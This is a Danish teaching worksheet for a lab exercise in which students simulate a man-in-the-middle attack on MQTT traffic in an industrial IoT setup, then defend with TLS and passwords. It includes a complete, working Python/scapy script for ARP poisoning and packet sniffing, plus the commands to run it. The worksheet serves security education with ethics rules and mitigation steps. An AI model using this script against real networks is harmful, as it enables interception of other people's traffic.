# 📝 Workshop 3: Ekstra Øvelse - Man-in-the-Middle via Netværk

## 🌟 Formål
I denne ekstra øvelse skal I simulere et ægte **Man-in-the-Middle (MITM)** angreb i et IIOT-miljø. Formålet er at forstå, hvordan ubeskyttede datastrømme kan opsnappes og manipuleres, samt hvordan vi beskytter os med TLS og adgangskontrol.

---

## 📊 Struktur og roller

| Rolle | Beskrivelse |
|:------|:------------|
| Studerende A (Angriber) | Udfører ARP spoofing og sniffer MQTT-trafik |
| Studerende B (Offer) | Kører Node-RED flow der sender MQTT-data |


## 📖 Regler og etik
- Kun på lukkede netværk (labnet, privat subnet).
- Kun mod frivillig medstuderende.
- Ingen forstyrrelser af andre systemer eller internettrafik.
- Alt MITM-aktivitet stoppes efter øvelsen.

---

## 🔄 Praktisk (step-by-step)

### 1. Opsæt offer (Studerende B)
- Kør Node-RED flow:
  - En sensor sender data via MQTT til broker.
  - Dashboard viser live data.

### 2. Få IP-adresser
- Studerende A får IP-adressen på Studerende B og gatewayen.

### 3. Kør MITM-script (Studerende A)
- Kør Python-script med scapy:
  - ARP spoofing mod offer og gateway.
  - Sniff MQTT-trafik (port 1883).

**Python script (mitm_sniffer.py):**
```python
from scapy.all import *
import threading
import time

# Parametre
target_ip = "192.168.1.20"
gateway_ip = "192.168.1.1"
interface = "eth0"

def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    else:
        return None

def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    poison_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
    poison_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
    while True:
        send(poison_target, verbose=0)
        send(poison_gateway, verbose=0)
        time.sleep(2)

def sniff_packets():
    sniff(iface=interface, filter="port 1883", prn=process_packet)

def process_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        print(f"Intercepted packet: {packet[Raw].load}")

if __name__ == "__main__":
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("MAC address resolution failed.")
        exit(1)

    poison_thread = threading.Thread(target=arp_poison, args=(target_ip, target_mac, gateway_ip, gateway_mac))
    poison_thread.start()

    print("Started ARP poisoning... Sniffing packets now.")
    sniff_packets()
```

**Installation:**
```bash
pip install scapy
sudo python3 mitm_sniffer.py
```

### 4. Observer opsnappede data
- Studerende A kan se beskeder sendt af Studerende B i terminalen.

### 5. Diskuter truslen
- Hvad kunne en angriber gøre?
- Hvad er konsekvensen af åben MQTT-trafik?

### 6. Implementér beskyttelse
- Studerende B sikrer MQTT-flow:
  - Aktivér TLS på MQTT broker og klient.
  - Opsæt brugernavn og adgangskode.

### 7. Test igen
- Studerende A forsøger MITM igen.
- Trafik er nu krypteret og uforståelig (beskyttet!).

### 8. Dokumentér og aflever
- Lav kort rapport:
  - Hvordan MITM lykkedes uden TLS.
  - Hvordan det mislykkedes med TLS.
  - Refleksion over vigtigheden af datasikkerhed.

---

## 🎉 Læringsudbytte
- Forståelse af MITM i praksis.
- Evne til at identificere sårbarheder i IIOT-systemer.
- Færdigheder i sikring af datastrømme med TLS.

---

# 💡 Tips
- Brug et dedikeret WiFi eller VLAN kun til denne øvelse.
- Brug tcpdump eller Wireshark til at analysere opsnappet trafik.
- Udvid øvelsen med manipulation af data (spoofing).

---
